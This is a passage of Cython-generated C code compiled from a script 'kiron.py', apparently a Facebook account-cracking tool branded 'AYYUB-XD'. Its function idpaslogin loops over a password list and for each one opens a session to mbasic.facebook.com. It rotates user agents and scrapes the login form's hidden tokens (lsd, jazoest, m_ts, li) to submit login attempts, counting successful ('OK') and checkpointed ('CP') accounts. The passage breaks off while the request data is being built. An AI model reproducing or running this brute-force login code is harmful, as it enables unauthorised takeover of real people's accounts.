  CYTHON_UNUSED PyObject *__pyx_v_cookies = NULL;
  PyObject *__pyx_v_uidx = NULL;
  PyObject *__pyx_v_ckk = NULL;
  PyObject *__pyx_v_res = NULL;
  PyObject *__pyx_8genexpr1__pyx_v_key = NULL;
  PyObject *__pyx_8genexpr1__pyx_v_value = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  Py_ssize_t __pyx_t_4;
  Py_UCS4 __pyx_t_5;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  Py_ssize_t __pyx_t_8;
  int __pyx_t_9;
  PyObject *__pyx_t_10 = NULL;
  PyObject *__pyx_t_11 = NULL;
  PyObject *__pyx_t_12 = NULL;
  PyObject *(*__pyx_t_13)(PyObject *);
  PyObject *__pyx_t_14 = NULL;
  PyObject *__pyx_t_15 = NULL;
  int __pyx_t_16;
  Py_ssize_t __pyx_t_17;
  int __pyx_t_18;
  int __pyx_t_19;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("idpaslogin", 0);
  __Pyx_INCREF(__pyx_v_uid);

  /* "kiron.py":403
 * def idpaslogin(uid,passlist,tl):
 *         global loop,oks,cps
 *         sys.stdout.write(f"\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-XD\x1b[38;5;244m] \x1b[38;5;244m[\x1b[38;5;81m{loop}\x1b[38;5;244m] \x1b[38;5;46mOK\033[1;37m|\x1b[38;5;46m{len(oks)} \x1b[38;5;81mCP\033[1;37m|\x1b[38;5;81m{len(cps)} ");sys.stdout.flush()             # <<<<<<<<<<<<<<
 *         try:
 *             for ps in passlist:
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_sys); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 403, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_stdout); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 403, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_write); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 403, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyTuple_New(7); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 403, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_4 = 0;
  __pyx_t_5 = 127;
  __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_46mAYYUB_XD_38_5);
  __pyx_t_4 += 66;
  __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_46mAYYUB_XD_38_5);
  PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_kp_u_38_5_244m_38_5_46mAYYUB_XD_38_5);
  __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_loop); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 403, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_7 = __Pyx_PyObject_FormatSimple(__pyx_t_6, __pyx_empty_unicode); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 403, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_7);
  __Pyx_GIVEREF(__pyx_t_7);
  PyTuple_SET_ITEM(__pyx_t_3, 1, __pyx_t_7);
  __pyx_t_7 = 0;
  __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_46mOK_1_37m_38_5);
  __pyx_t_4 += 43;
  __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_46mOK_1_37m_38_5);
  PyTuple_SET_ITEM(__pyx_t_3, 2, __pyx_kp_u_38_5_244m_38_5_46mOK_1_37m_38_5);
  __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_oks); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 403, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_8 = PyObject_Length(__pyx_t_7); if (unlikely(__pyx_t_8 == ((Py_ssize_t)-1))) __PYX_ERR(0, 403, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyUnicode_From_Py_ssize_t(__pyx_t_8, 0, ' ', 'd'); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 403, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_7);
  __Pyx_GIVEREF(__pyx_t_7);
  PyTuple_SET_ITEM(__pyx_t_3, 3, __pyx_t_7);
  __pyx_t_7 = 0;
  __Pyx_INCREF(__pyx_kp_u_38_5_81mCP_1_37m_38_5_81m);
  __pyx_t_4 += 31;
  __Pyx_GIVEREF(__pyx_kp_u_38_5_81mCP_1_37m_38_5_81m);
  PyTuple_SET_ITEM(__pyx_t_3, 4, __pyx_kp_u_38_5_81mCP_1_37m_38_5_81m);
  __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_cps); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 403, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_8 = PyObject_Length(__pyx_t_7); if (unlikely(__pyx_t_8 == ((Py_ssize_t)-1))) __PYX_ERR(0, 403, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyUnicode_From_Py_ssize_t(__pyx_t_8, 0, ' ', 'd'); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 403, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_7);
  __Pyx_GIVEREF(__pyx_t_7);
  PyTuple_SET_ITEM(__pyx_t_3, 5, __pyx_t_7);
  __pyx_t_7 = 0;
  __Pyx_INCREF(__pyx_kp_u__25);
  __pyx_t_4 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__25);
  PyTuple_SET_ITEM(__pyx_t_3, 6, __pyx_kp_u__25);
  __pyx_t_7 = __Pyx_PyUnicode_Join(__pyx_t_3, 7, __pyx_t_4, __pyx_t_5); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 403, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = NULL;
  __pyx_t_9 = 0;
  #if CYTHON_UNPACK_METHODS
  if (likely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
      __pyx_t_9 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_3, __pyx_t_7};
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_9, 1+__pyx_t_9);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 403, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_sys); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 403, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_stdout); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 403, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_flush); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 403, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = NULL;
  __pyx_t_9 = 0;
  #if CYTHON_UNPACK_METHODS
  if (likely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_7)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_7);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
      __pyx_t_9 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_7, NULL};
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_9, 0+__pyx_t_9);
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 403, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "kiron.py":404
 *         global loop,oks,cps
 *         sys.stdout.write(f"\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-XD\x1b[38;5;244m] \x1b[38;5;244m[\x1b[38;5;81m{loop}\x1b[38;5;244m] \x1b[38;5;46mOK\033[1;37m|\x1b[38;5;46m{len(oks)} \x1b[38;5;81mCP\033[1;37m|\x1b[38;5;81m{len(cps)} ");sys.stdout.flush()
 *         try:             # <<<<<<<<<<<<<<
 *             for ps in passlist:
 *                     session = requests.Session()
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_10, &__pyx_t_11, &__pyx_t_12);
    __Pyx_XGOTREF(__pyx_t_10);
    __Pyx_XGOTREF(__pyx_t_11);
    __Pyx_XGOTREF(__pyx_t_12);
    /*try:*/ {

      /* "kiron.py":405
 *         sys.stdout.write(f"\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-XD\x1b[38;5;244m] \x1b[38;5;244m[\x1b[38;5;81m{loop}\x1b[38;5;244m] \x1b[38;5;46mOK\033[1;37m|\x1b[38;5;46m{len(oks)} \x1b[38;5;81mCP\033[1;37m|\x1b[38;5;81m{len(cps)} ");sys.stdout.flush()
 *         try:
 *             for ps in passlist:             # <<<<<<<<<<<<<<
 *                     session = requests.Session()
 *                     free_fb = session.get('https://mbasic.facebook.com').text
 */
      if (likely(PyList_CheckExact(__pyx_v_passlist)) || PyTuple_CheckExact(__pyx_v_passlist)) {
        __pyx_t_1 = __pyx_v_passlist; __Pyx_INCREF(__pyx_t_1);
        __pyx_t_4 = 0;
        __pyx_t_13 = NULL;
      } else {
        __pyx_t_4 = -1; __pyx_t_1 = PyObject_GetIter(__pyx_v_passlist); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 405, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_13 = __Pyx_PyObject_GetIterNextFunc(__pyx_t_1); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 405, __pyx_L3_error)
      }
      for (;;) {
        if (likely(!__pyx_t_13)) {
          if (likely(PyList_CheckExact(__pyx_t_1))) {
            {
              Py_ssize_t __pyx_temp = __Pyx_PyList_GET_SIZE(__pyx_t_1);
              #if !CYTHON_ASSUME_SAFE_MACROS
              if (unlikely((__pyx_temp < 0))) __PYX_ERR(0, 405, __pyx_L3_error)
              #endif
              if (__pyx_t_4 >= __pyx_temp) break;
            }
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_2 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_4); __Pyx_INCREF(__pyx_t_2); __pyx_t_4++; if (unlikely((0 < 0))) __PYX_ERR(0, 405, __pyx_L3_error)
            #else
            __pyx_t_2 = __Pyx_PySequence_ITEM(__pyx_t_1, __pyx_t_4); __pyx_t_4++; if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 405, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_2);
            #endif
          } else {
            {
              Py_ssize_t __pyx_temp = __Pyx_PyTuple_GET_SIZE(__pyx_t_1);
              #if !CYTHON_ASSUME_SAFE_MACROS
              if (unlikely((__pyx_temp < 0))) __PYX_ERR(0, 405, __pyx_L3_error)
              #endif
              if (__pyx_t_4 >= __pyx_temp) break;
            }
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_2 = PyTuple_GET_ITEM(__pyx_t_1, __pyx_t_4); __Pyx_INCREF(__pyx_t_2); __pyx_t_4++; if (unlikely((0 < 0))) __PYX_ERR(0, 405, __pyx_L3_error)
            #else
            __pyx_t_2 = __Pyx_PySequence_ITEM(__pyx_t_1, __pyx_t_4); __pyx_t_4++; if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 405, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_2);
            #endif
          }
        } else {
          __pyx_t_2 = __pyx_t_13(__pyx_t_1);
          if (unlikely(!__pyx_t_2)) {
            PyObject* exc_type = PyErr_Occurred();
            if (exc_type) {
              if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
              else __PYX_ERR(0, 405, __pyx_L3_error)
            }
            break;
          }
          __Pyx_GOTREF(__pyx_t_2);
        }
        __Pyx_XDECREF_SET(__pyx_v_ps, __pyx_t_2);
        __pyx_t_2 = 0;

        /* "kiron.py":406
 *         try:
 *             for ps in passlist:
 *                     session = requests.Session()             # <<<<<<<<<<<<<<
 *                     free_fb = session.get('https://mbasic.facebook.com').text
 *                     us = usergent()
 */
        __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_requests); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 406, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_7);
        __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_Session); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 406, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = NULL;
        __pyx_t_9 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_3))) {
          __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_3);
          if (likely(__pyx_t_7)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
            __Pyx_INCREF(__pyx_t_7);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_3, function);
            __pyx_t_9 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_7, NULL};
          __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_9, 0+__pyx_t_9);
          __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
          if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 406, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        }
        __Pyx_XDECREF_SET(__pyx_v_session, __pyx_t_2);
        __pyx_t_2 = 0;

        /* "kiron.py":407
 *             for ps in passlist:
 *                     session = requests.Session()
 *                     free_fb = session.get('https://mbasic.facebook.com').text             # <<<<<<<<<<<<<<
 *                     us = usergent()
 *                     data = {
 */
        __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_session, __pyx_n_s_get); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 407, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __pyx_t_7 = NULL;
        __pyx_t_9 = 0;
        #if CYTHON_UNPACK_METHODS
        if (likely(PyMethod_Check(__pyx_t_3))) {
          __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_3);
          if (likely(__pyx_t_7)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
            __Pyx_INCREF(__pyx_t_7);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_3, function);
            __pyx_t_9 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_7, __pyx_kp_s_https_mbasic_facebook_com};
          __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_9, 1+__pyx_t_9);
          __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
          if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 407, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        }
        __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_text); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 407, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF_SET(__pyx_v_free_fb, __pyx_t_3);
        __pyx_t_3 = 0;

        /* "kiron.py":408
 *                     session = requests.Session()
 *                     free_fb = session.get('https://mbasic.facebook.com').text
 *                     us = usergent()             # <<<<<<<<<<<<<<
 *                     data = {
 *                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
 */
        __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_usergent); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 408, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_7 = NULL;
        __pyx_t_9 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_2))) {
          __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_2);
          if (likely(__pyx_t_7)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
            __Pyx_INCREF(__pyx_t_7);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_2, function);
            __pyx_t_9 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_7, NULL};
          __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_9, 0+__pyx_t_9);
          __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
          if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 408, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        }
        __Pyx_XDECREF_SET(__pyx_v_us, __pyx_t_3);
        __pyx_t_3 = 0;

        /* "kiron.py":410
 *                     us = usergent()
 *                     data = {
 *                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),             # <<<<<<<<<<<<<<
 *             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
 *             "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
 */
        __pyx_t_3 = __Pyx_PyDict_NewPresized(9); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 410, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_re); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 410, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_14 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_search); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 410, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_14);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = __Pyx_PyObject_Str(__pyx_v_free_fb); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 410, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_15 = NULL;
        __pyx_t_9 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_14))) {
          __pyx_t_15 = PyMethod_GET_SELF(__pyx_t_14);
          if (likely(__pyx_t_15)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_14);
            __Pyx_INCREF(__pyx_t_15);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_14, function);
            __pyx_t_9 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[3] = {__pyx_t_15, __pyx_kp_s_name_lsd_value, __pyx_t_6};
          __pyx_t_7 = __Pyx_PyObject_FastCall(__pyx_t_14, __pyx_callargs+1-__pyx_t_9, 2+__pyx_t_9);
          __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 410, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
        }
        __pyx_t_14 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_group); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 410, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_14);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = NULL;
        __pyx_t_9 = 0;
        #if CYTHON_UNPACK_METHODS
        if (likely(PyMethod_Check(__pyx_t_14))) {
          __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_14);
          if (likely(__pyx_t_7)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_14);
            __Pyx_INCREF(__pyx_t_7);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_14, function);
            __pyx_t_9 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_7, __pyx_int_1};
          __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_14, __pyx_callargs+1-__pyx_t_9, 1+__pyx_t_9);
          __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
          if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 410, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
        }
        if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_lsd, __pyx_t_2) < 0) __PYX_ERR(0, 410, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

        /* "kiron.py":411
 *                     data = {
 *                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
 *             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),             # <<<<<<<<<<<<<<
 *             "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
 *             "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
 */
        __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_re); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_7);
        __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_search); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = __Pyx_PyObject_Str(__pyx_v_free_fb); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_7);
        __pyx_t_15 = NULL;
        __pyx_t_9 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_6))) {
          __pyx_t_15 = PyMethod_GET_SELF(__pyx_t_6);
          if (likely(__pyx_t_15)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
            __Pyx_INCREF(__pyx_t_15);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_6, function);
            __pyx_t_9 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[3] = {__pyx_t_15, __pyx_kp_s_name_jazoest_value, __pyx_t_7};
          __pyx_t_14 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_9, 2+__pyx_t_9);
          __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 411, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_14);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        }
        __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_14, __pyx_n_s_group); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
        __pyx_t_14 = NULL;
        __pyx_t_9 = 0;
        #if CYTHON_UNPACK_METHODS
        if (likely(PyMethod_Check(__pyx_t_6))) {
          __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_6);
          if (likely(__pyx_t_14)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
            __Pyx_INCREF(__pyx_t_14);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_6, function);
            __pyx_t_9 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_14, __pyx_int_1};
          __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_9, 1+__pyx_t_9);
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 411, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        }
        if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_jazoest, __pyx_t_2) < 0) __PYX_ERR(0, 410, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

        /* "kiron.py":412
 *                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
 *             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
 *             "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),             # <<<<<<<<<<<<<<
 *             "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
 *             "try_number":"0",
 */
        __Pyx_GetModuleGlobalName(__pyx_t_14, __pyx_n_s_re); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 412, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_14);
        __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_14, __pyx_n_s_search); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 412, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
        __pyx_t_14 = __Pyx_PyObject_Str(__pyx_v_free_fb); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 412, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_14);
        __pyx_t_15 = NULL;
        __pyx_t_9 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_7))) {
          __pyx_t_15 = PyMethod_GET_SELF(__pyx_t_7);
          if (likely(__pyx_t_15)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
            __Pyx_INCREF(__pyx_t_15);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_7, function);
            __pyx_t_9 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[3] = {__pyx_t_15, __pyx_kp_s_name_m_ts_value, __pyx_t_14};
          __pyx_t_6 = __Pyx_PyObject_FastCall(__pyx_t_7, __pyx_callargs+1-__pyx_t_9, 2+__pyx_t_9);
          __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 412, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
